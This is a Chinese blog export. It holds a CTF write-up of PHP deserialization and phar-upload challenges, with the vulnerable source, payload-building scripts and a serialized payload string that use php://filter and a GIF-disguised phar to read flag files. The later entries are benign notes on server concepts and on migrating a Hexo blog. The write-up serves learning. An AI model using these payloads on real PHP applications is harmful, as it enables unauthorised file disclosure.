language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;  <span class="comment">//c影响b，同时会影响a</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);     <span class="comment">//相当于echo,和tostring一起利用</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]);   <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable language_">$this</span>-&gt;b;  <span class="comment">//&amp;引用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();   <span class="comment">//c-&gt;b-&gt;a   ，调用include函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">cat</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134539841.png"><br><strong>?cat&#x3D;O:3:”cat”:3:{s:1:”a”;s:3:”xxx”;s:1:”b”;R:2;s:1:”c”;O:5:”mouse”:1:{s:1:”v”;s:52:”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}}</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134605497.png"><br>base64解码</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134626881.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134652521.png"><br>这个是phar反序列化的触发函数<br>构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>要被自己蠢死，没有运行脚本直接上传，能出flag才怪，好丢人啊啊啊😭<br>运行脚本后产生phar文件，改成jpg格式上传，然后访问，就能得到flag<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134720305.png"><br>其中好多题都是大佬教给我做的，感谢，tql  !😍</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 刷题 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器基本概念</title>
      <link href="/archives/51925.html"/>
      <url>/archives/51925.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="服务器的概念"><a href="#服务器的概念" class="headerlink" title="服务器的概念"></a>服务器的概念</h2><p>服务器是计算机的一种，承担响应服务请求，承担服务，保障服务能力。<strong>通俗的来讲就是我们的本地电脑，通过远程进行控制</strong>（公网IP）稳定性要好。</p><h2 id="服务器的作用"><a href="#服务器的作用" class="headerlink" title="服务器的作用"></a>服务器的作用</h2><p>通俗的来说，服务器主要是用来响应终端服务请求，并进行处理。我们在上网的时候是不可能直接将网络接入互联网的，我们都需要通过服务器接入网络的，只有服务器响应联网请求，并进行处理后才能联网，服务器的存储空间比较充足，可以存储非常多的信息。</p><blockquote><p>相当于中介人，通过它才能联网</p></blockquote><h2 id="服务器的分类"><a href="#服务器的分类" class="headerlink" title="服务器的分类"></a>服务器的分类</h2><h4 id="按物理形态："><a href="#按物理形态：" class="headerlink" title="按物理形态："></a>按物理形态：</h4><h5 id="服务器：（了解）"><a href="#服务器：（了解）" class="headerlink" title="服务器：（了解）"></a>服务器：（了解）</h5><p>可以理解为放在远程机房的独立计算机，可以进行远程访问控制，可以解析绑定域名，并通过域名或ip访问服务器上的网站</p><h5 id="ECS服务器："><a href="#ECS服务器：" class="headerlink" title="ECS服务器："></a>ECS服务器：</h5><p><strong>很多用户用到的一种</strong>  云服务器（Eiastic Compute Service)的一种,用户可以根据自己需要选定主机容量，CPU能力，内存大小，带宽及购买时常等，也称为<strong>弹性计算服务器</strong>，ESC在使用和独立的服务器没有区别，且可以让企业节省自行购买和维护服务器硬件的成本，ESC已被中小企业广泛使用。</p><h5 id="VPS服务器："><a href="#VPS服务器：" class="headerlink" title="VPS服务器："></a>VPS服务器：</h5><p>虚拟专用服务器（Virtual Private Server），即将一台独立服务器通过虚拟技术分割为若干个虚拟服务器(一个分多个)，每个VPS可以独立安装系统，拥有独立的IP，实现不同VPS间磁盘空间，内存，CPU资源，进程和系统配置的隔离   ,VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器，形式上和ECS没有区别，但总体性能和灵活性不如ECS.</p><h5 id="虚拟主机："><a href="#虚拟主机：" class="headerlink" title="虚拟主机："></a>虚拟主机：</h5><p>即将一台已安装操作系统和安全防范的服务器通过技术手段分割为若干个独立的空间，分配给用户独立使用，用户只需要上传网站程序，解析和绑定域名即可使用。虚拟主机不同于服务器，用户无法安装操作系统和操作软件，只能运行网站脚本语言，HTML文件，图片及其他静态文件等。（<strong>只能放脚本语言使用</strong>）虚拟主机相当于若干个用户一起租用一台服务器，价格实惠，简单易用，因此大多数企业网站选择了虚拟主机，而自助建站及云建站使用的也是虚拟主机。（不需要自己去维护）</p><h4 id="按物理位置分类："><a href="#按物理位置分类：" class="headerlink" title="按物理位置分类："></a>按物理位置分类：</h4><p>国内主机</p><p>国外主机</p><ol><li>备案方面：国内主机必须备案，国外主机不需要提交备案资料</li><li>访问速度：国内主机国内访问快，国外主机国外访问速度快</li><li>线路：国内主机有线路限制，海外主机没有，国内主机线路以联通和电信为主，相同线路访问不存在速度限制，不同则有</li></ol><h3 id="（服务器主要运营平台）"><a href="#（服务器主要运营平台）" class="headerlink" title="（服务器主要运营平台）"></a>（服务器主要运营平台）</h3><ol><li>阿里云  </li><li>西部数码</li><li>腾讯云</li><li>百度云</li><li>京东云</li></ol><h2 id="服务器的关键参数指标"><a href="#服务器的关键参数指标" class="headerlink" title="服务器的关键参数指标*"></a>服务器的关键参数指标*</h2><h3 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h3><h4 id="Windows-server"><a href="#Windows-server" class="headerlink" title="Windows server"></a>Windows server</h4><h4 id="NetWare"><a href="#NetWare" class="headerlink" title="NetWare"></a>NetWare</h4><h4 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h4><h4 id="Linux-（相比Windows系统运行效率更高，更安全）"><a href="#Linux-（相比Windows系统运行效率更高，更安全）" class="headerlink" title="Linux  （相比Windows系统运行效率更高，更安全）"></a>Linux  （<strong>相比Windows系统运行效率更高，更安全</strong>）</h4><p>例如删除文件，飞快</p><h3 id="支持脚本："><a href="#支持脚本：" class="headerlink" title="支持脚本："></a>支持脚本：</h3><p>即是否网站程序常见的开发语言，主要有asp及.net,php,jsp,一般需要根据网站程序所使用的开发语言选择，支持的开发语言越少主机越安全和高效。</p><h3 id="空间容量："><a href="#空间容量：" class="headerlink" title="空间容量："></a>空间容量：</h3><p>存放文件的空间大小，企业网站一般可以根据图片和视频文件的大小来选择，以及主机的使用年限，一般1-5G（虚拟主机）就够了，再大一点可以选择使用自己的服务器</p><h3 id="主机带宽："><a href="#主机带宽：" class="headerlink" title="主机带宽："></a>主机带宽：</h3><p>单位时间内传输数据的概念，带宽越大，访问速度越快</p><h3 id="访问流量："><a href="#访问流量：" class="headerlink" title="访问流量："></a>访问流量：</h3><p>相当于手机上的流量</p><h3 id="并发量："><a href="#并发量：" class="headerlink" title="并发量："></a>并发量：</h3><p>网站在同一时间访问的人数，人数越大，瞬间带宽要求更高</p><h3 id="CPU和内存："><a href="#CPU和内存：" class="headerlink" title="CPU和内存："></a>CPU和内存：</h3><p>CPU中央处理器，代表服务器的运行计算能力，也就是对网站程序的响应速度和效率，如果在不考虑成本的情况下，当然是CPU多核，内存越大性能越高，但企业网站的数据是有限的，一般双核，4G就可以满足基本使用。</p><h3 id="服务器IP类型：独立IP和共享IP"><a href="#服务器IP类型：独立IP和共享IP" class="headerlink" title="服务器IP类型：独立IP和共享IP"></a>服务器IP类型：独立IP和共享IP</h3><p>1.价格方面：共享IP要比独立IP便宜.<br>2.风险问题：共享IP易受到外来网络攻击，且其中一个网站出现问题就会波及其他站点，而独立IP就不会受到这种连带波及问题。<br>3.收录影响：独立IP更有利于被搜索引擎收录，权重更高.<br>4.域名绑定区别：独立IP可以实现泛域名绑定，而共享IP无法实现泛域名绑定，<br>5.能否直接使用IP访问：独立IP可以直接使用IP访问，共享IP不能，若访问就会收到报错的提示。</p><h3 id="扩展性能："><a href="#扩展性能：" class="headerlink" title="扩展性能："></a>扩展性能：</h3><p>支持语言，是否支持伪静态，字体等</p><h3 id="安全性能："><a href="#安全性能：" class="headerlink" title="安全性能："></a>安全性能：</h3><p>防火墙，（防止ddos攻击产品）工作原理引流</p><p>数据备份等</p><h3 id="CDN："><a href="#CDN：" class="headerlink" title="CDN："></a>CDN：</h3><p>将源站内容发布至最接近用户的节点，使用户可就近接收所要获取的内容，提高用户的访问响应速度和成功率。</p><p>解决因分布，带宽，服务器性能带来的访问延迟问题，适用于站点加速，点播，直播等场景。</p><p>七牛云，coding，又拍云等</p><h2 id="如何选择服务器主机"><a href="#如何选择服务器主机" class="headerlink" title="如何选择服务器主机"></a>如何选择服务器主机</h2><p>首先要明白自己的服务器是干什么的，是放网站还是用来搭建局域网和放置游戏等，就知道怎么选择自己的服务器类型了。</p><p>1.根据网站选择服务器支持语言，一定要匹配。</p><p>例如：PHP网站选择PHP运行环境的主机</p><p>2.根据网站受众选择服务器网络</p><p>受众群在国内选择国内主机，国外选择国外主机</p><p>3.根据网站内容选择最低服务器容量</p><p>4.判断服务器安全性能，品牌与措施</p><p>选择知名度大的，阿里云，腾讯云等，安全性有保障</p><p>5.判断服务器质量</p><p>CPU运行内存,带宽，并发量的关键性参数，这个参数会直接影响到网站的运行速度以及网站的稳定性（便宜没好货，一分价钱一分货）</p><p>6.比较价格与服务</p><p>服务器肯定要比虚拟主机好各大云平台的ECS服务器，但是考虑到成本，中小企业选择虚拟主机足够，不需要自己维护，成本也够低</p><hr><p>windows虚拟主机还是linux虚拟主机好？<br>ASP、NET开发的网站只能使用windows虚拟主机，PHP、JSP开发的网站一般可以兼容windows利linux虚拟主机。<br>而linux操作系统服务器在安全和稳定性能、处理效率等方面有着明显的优势，因此如果你的网站程序开发语言是PHP或JSP，则建议选择linux虚拟主机。<strong>首选Linux主机</strong></p><p>100Mb共享带宽和2Mb独享带宽哪个速度更快？</p><p>带宽是服务器的核心指标，但现实使用中并不是带宽越大速度越快。100Mb共享带宽是一台服务器上所有网站共享，相比较还是2Mb独享带宽好，速度和稳定性都要好很多。</p><p>一般来说，选择cpu2核4G，3M的带宽配置性能就够用，最好选择Linux系统</p><h2 id="如何管理服务器主机"><a href="#如何管理服务器主机" class="headerlink" title="如何管理服务器主机"></a>如何管理服务器主机</h2><h3 id="FTP是什么？"><a href="#FTP是什么？" class="headerlink" title="FTP是什么？"></a>FTP是什么？</h3><p>FTP(File Transfer Protocol,文件传输协议)，是TCP&#x2F;IP协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。</p><h3 id="有什么作用？"><a href="#有什么作用？" class="headerlink" title="有什么作用？"></a>有什么作用？</h3><p>对于客户端：是为了客户端链接主机来管理自己的主机文件（上传与下载）</p><p>对于主机商：可以用FTP实现限制不同虚拟主机分配给用户对服务器的管理权限</p><h3 id="FTP链接模式"><a href="#FTP链接模式" class="headerlink" title="FTP链接模式"></a>FTP链接模式</h3><h4 id="主动模式（port模式"><a href="#主动模式（port模式" class="headerlink" title="主动模式（port模式)"></a>主动模式（port模式)</h4><p>客户端发送控制链接到服务器的FTP端口，一般是默认设置为21，然后服务器的数据端口20主动去连接用户的客户端n+1的数据端口</p><h4 id="被动模式（passive模式"><a href="#被动模式（passive模式" class="headerlink" title="被动模式（passive模式)"></a>被动模式（passive模式)</h4><p>客户端发送控制链接到服务器的FTP端口，一般是默认设置为21，客户端的数据端口n+1端口，主动链接的服务器的数据20端口</p><h3 id="FTP的主要信息"><a href="#FTP的主要信息" class="headerlink" title="FTP的主要信息"></a>FTP的主要信息</h3><ol><li><p>FTP的链接地址</p></li><li><p>FTP的登陆账号和密码</p></li><li><p>FTP的连接的端口号</p><h3 id="常用的FTP管理工具"><a href="#常用的FTP管理工具" class="headerlink" title="常用的FTP管理工具"></a>常用的FTP管理工具</h3><p>FileZilla</p><p>flashfxp</p></li></ol><p>虚拟主机：</p><p>FTP信息到主机的控制面板去查找</p><p>服务器：</p><p>Windows系统：通过远程桌面去连接</p><p>Linux系统:通过XSHELL或者是PUTTY等链接工具（服务器的账号密码也是FTP信息）</p><p>eCS服务器：</p><p>直接通过服务器的管理员账号登陆管理也可以通过设置搭建FTP信息去管理（常见的服务端FTP管理工具，Serv-U,IIS,ossftp)</p><h3 id="防火墙的开启："><a href="#防火墙的开启：" class="headerlink" title="防火墙的开启："></a>防火墙的开启：</h3><p>WINDOWS</p><p>Linux：</p><p>开启：service iptables start</p><p>关闭：service iptables stop</p><p>iptables-I INPUT -p tcp –dport 3306 -j ACCEPT</p><p>其他高级设置（php版本，网站默认首页，404，301）</p><p> 数据库备份</p>]]></content>
      
      
      <categories>
          
          <category> 基础学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
            <tag> 云服务器 </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客迁移node.js换路径npm安装及报错问题</title>
      <link href="/archives/1.html"/>
      <url>/archives/1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h2><p>先把自己blog根目录复制一份，删除里面的node_modules文件夹</p><p>，后续操作可以重新下载过来，然后在新电脑的操作和hexo博客搭建的过程一样</p><h3 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h3><p> <a href="https://github.com/git-for-windows/git/releases/download/v2.37.2.windows.2/Git-2.37.2.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.37.2.windows.2/Git-2.37.2.2-64-bit.exe</a></p><p>这是Windows的下载路径</p><p>gitbash输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;用户名随意&quot;</span><br><span class="line">git config --global user.email  &quot;123456@qq.com&quot; #填写github注册的邮箱</span><br></pre></td></tr></table></figure><p>添加系统环境变量   path</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816132545179.png"></p><h3 id="2-配置SSH"><a href="#2-配置SSH" class="headerlink" title="2.配置SSH"></a>2.配置SSH</h3><p><a href="https://blog.csdn.net/weixin_42569846/article/details/105808683?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166062730116782388086147%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166062730116782388086147&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-1-105808683-null-null.142%5Ev40%5Epc_rank_34_2,185%5Ev2%5Econtrol&utm_term=hexo%20github%E9%85%8D%E7%BD%AEssh&spm=1018.2226.3001.4187">参考的博客链接</a></p><h3 id="3，node-js安装及切换路径"><a href="#3，node-js安装及切换路径" class="headerlink" title="3，node.js安装及切换路径"></a>3，node.js安装及切换路径</h3><p>这里我下载了好几次，是安装包.msi下载，但是修改路径的时候一直出错，最后还是选择.zip下载，直接解压到D盘，</p><p>我又安装的是其他较早的版本，考虑到新版本不兼容问题，保险起见，选择旧版本  我选择的版本是12.16.1</p><p>这是node.js的版本下载地址<a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a></p><p>下载完直接解压缩到D盘</p><p>然后在文件夹里添加两个新文件，一个是node_global    另一个是node_cache</p><blockquote><p>设置全局模块的安装路径到 “node_global” 文件夹，<br>设置缓存到 “node_cache” 文件夹</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816134145133.png" style="zoom:80%;" /><p>配置用户变量path</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816140141145.png" style="zoom:80%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816135822031.png"></p><p>打开管理员命令面板  输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set prefix &quot;D:\node-v12.16.1-win-x64\node_global(你自己的node_global路径)&quot;</span><br><span class="line">npm config set cache &quot;D:\node-v12.16.1-win-x64\node_cache(你自己的)&quot;</span><br></pre></td></tr></table></figure><p><code>npm install gulp -g</code>   再使用这个命令安装gulp</p><p><code>npm config list</code>      查看npm镜像源</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816134732879.png" style="zoom:80%;" /><p>我这里显示的是淘宝镜像源，因为我已经切换了</p><p><code>npm config set registry https://registry.npm.taobao.org/</code>    换源命令</p><p><code>npm config get registry</code>   验证换源是否成功，成功会显示你的淘宝源地址</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816135212479.png"></p><p><code>npm install hexo-cli -g</code>   安装hexo</p><h3 id="4-将blog文件转移到新电脑"><a href="#4-将blog文件转移到新电脑" class="headerlink" title="4.将blog文件转移到新电脑"></a>4.将blog文件转移到新电脑</h3><p>打开gitbash把删掉的文件node_modules装回来</p><p><code>npm install</code></p><p>如果遇到报错问题    </p><blockquote><p>npm ERR! Error while executing: npm ERR! D:\Git\cmd\git.EXE ls-remote -h -t</p><p>后面还有一大串ERR!</p></blockquote><p>依次执行以下命令，报错也执行（在网上找的解决办法，我遇到此问题这样解决了）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global url.&quot;https://&quot;.insteadOf git://  </span><br><span class="line">npm config set registry https://registry.npm.taobao.org</span><br><span class="line">npm  install</span><br><span class="line">npm run dev</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至此，博客迁移成功</p><p>因为是纯小白安装迁移，中间遇到了很多问题，最后总结的这么多，比较精简，留个记录</p>]]></content>
      
      
      <categories>
          
          <category> 安装记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> node.js </tag>
            
            <tag> 报错 </tag>
            
            <tag> 记录 </tag>
            
            <tag> ERR! </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
